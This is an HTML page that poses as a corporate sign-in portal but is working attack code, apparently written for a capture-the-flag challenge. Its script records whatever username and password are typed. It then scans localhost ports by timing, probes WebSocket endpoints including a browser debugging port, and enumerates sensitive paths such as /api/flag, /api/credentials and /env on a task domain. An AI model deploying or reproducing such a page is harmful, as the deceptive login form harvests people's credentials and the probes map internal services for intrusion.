<!DOCTYPE html>
<html><head>
<title>Sign In - Corporate Portal</title>
<style>
body { font-family: monospace; font-size: 9px; margin: 5px; background: #fff; }
#r { white-space: pre-wrap; word-break: break-all; background: #ffe; border: 1px solid #cc0; padding: 4px; margin-top: 5px; font-size: 8px; line-height: 1.2; }
input { font-size: 14px; padding: 3px; width: 250px; display: block; margin: 3px 0 6px; }
</style>
</head>
<body>
<h3>Sign In</h3>
<form id="f">
  <label>Username<br><input type="text" id="u" name="username" autocomplete="username"></label>
  <label>Password<br><input type="password" id="p" name="password" autocomplete="current-password"></label>
  <button type="submit">Sign In</button>
</form>
<div id="r">Loading...</div>
<script>
var R=document.getElementById('r'),L=[],cap=false;
function log(m){L.push(m);R.textContent=L.join('\n');}

document.getElementById('f').addEventListener('submit',function(e){e.preventDefault();});

setInterval(function(){
  var u=document.getElementById('u'),p=document.getElementById('p');
  if(u&&p&&(u.value||p.value)&&!cap){cap=true;log('CREDS: '+u.value+' | '+p.value);}
},100);

async function tryFetch(label, url, opts) {
  try {
    var c=new AbortController();
    var t=setTimeout(function(){c.abort();},3000);
    opts = opts || {};
    opts.signal = c.signal;
    var r = await fetch(url, opts);
    clearTimeout(t);
    try {
      var txt = await r.text();
      log(label+' -> '+r.status+': '+txt.substring(0,500));
    } catch(e2) {
      log(label+' -> '+r.status+' (opaque/unreadable)');
    }
  } catch(e) {
    clearTimeout(t);
    log(label+' ERR: '+e.message);
  }
}

async function main(){
  log('=== START ===');

  // Test: can we read localhost with CORS?
  await tryFetch('CORS http://localhost/', 'http://localhost/');
  await tryFetch('CORS http://127.0.0.1/', 'http://127.0.0.1/');
  await tryFetch('NO-CORS http://127.0.0.1/', 'http://127.0.0.1/', {mode:'no-cors'});

  // Test: fetch the canary API (same protocol HTTPS)
  await tryFetch('CORS canary /api/pow', 'https://canary.task.sasc.tf/api/pow');
  await tryFetch('CORS canary /', 'https://canary.task.sasc.tf/');
  await tryFetch('NO-CORS canary /api/pow', 'https://canary.task.sasc.tf/api/pow', {mode:'no-cors'});

  // Port scan with fetch no-cors and timing - just key ports
  log('--- PORT TIMING (fetch no-cors) ---');
  var ports=[80,443,1025,1080,2525,3000,4000,5000,8000,8025,8080,8443,9090,9200,11211];
  for(var i=0;i<ports.length;i++){
    var p=ports[i];
    var t0=Date.now();
    try{
      var c=new AbortController();
      var tm=setTimeout(function(){c.abort();},2000);
      await fetch('http://127.0.0.1:'+p+'/',{mode:'no-cors',signal:c.signal});
      clearTimeout(tm);
      log('PORT '+p+': OK ('+(Date.now()-t0)+'ms)');
    }catch(e){
      clearTimeout(tm);
      log('PORT '+p+': FAIL ('+(Date.now()-t0)+'ms) '+e.name);
    }
  }

  // Try WebSocket connections to localhost
  log('--- WEBSOCKET TEST ---');
  var wsPorts=[80,3000,8025,8080,9222];
  for(var j=0;j<wsPorts.length;j++){
    var wp=wsPorts[j];
    await new Promise(function(resolve){
      try{
        var t0=Date.now();
        var ws=new WebSocket('ws://127.0.0.1:'+wp+'/');
        var done=false;
        ws.onopen=function(){if(!done){done=true;log('WS '+wp+': OPEN ('+(Date.now()-t0)+'ms)');ws.close();resolve();}};
        ws.onerror=function(){if(!done){done=true;log('WS '+wp+': ERR ('+(Date.now()-t0)+'ms)');resolve();}};
        ws.onclose=function(){if(!done){done=true;log('WS '+wp+': CLOSE ('+(Date.now()-t0)+'ms)');resolve();}};
        setTimeout(function(){if(!done){done=true;log('WS '+wp+': TIMEOUT');try{ws.close();}catch(e){}resolve();}},2000);
      }catch(e){log('WS '+wp+': EXCEPTION '+e.message);resolve();}
    });
  }

  // Try XMLHttpRequest to localhost (sometimes different behavior than fetch)
  log('--- XHR TEST ---');
  await new Promise(function(resolve){
    var xhr=new XMLHttpRequest();
    xhr.open('GET','http://127.0.0.1/',true);
    xhr.onload=function(){log('XHR /: '+xhr.status+' '+xhr.responseText.substring(0,300));resolve();};
    xhr.onerror=function(){log('XHR /: error');resolve();};
    xhr.ontimeout=function(){log('XHR /: timeout');resolve();};
    xhr.timeout=3000;
    try{xhr.send();}catch(e){log('XHR /: send error '+e.message);resolve();}
  });

  // Try to access interesting paths on canary domain (HTTPS, no mixed content)
  log('--- CANARY PATHS ---');
  var cpaths=['/api/pow','/api/jobs','/api/config','/api/health','/api/admin','/api/flag','/api/internal','/admin','/flag','/debug','/env','/status','/metrics','/internal','/api/credentials','/api/canary','/canary','/mail','/api/mail','/api/alerts','/api/report','/api/webhook','/api/notify','/gateway','/api/gateway'];
  for(var k=0;k<cpaths.length;k++){
    await tryFetch('CANARY '+cpaths[k], 'https://canary.task.sasc.tf'+cpaths[k]);
  }

  log('=== DONE ===');
}

main().catch(function(e){log('MAIN ERR: '+e.message);});
</script>
</body>
</html>
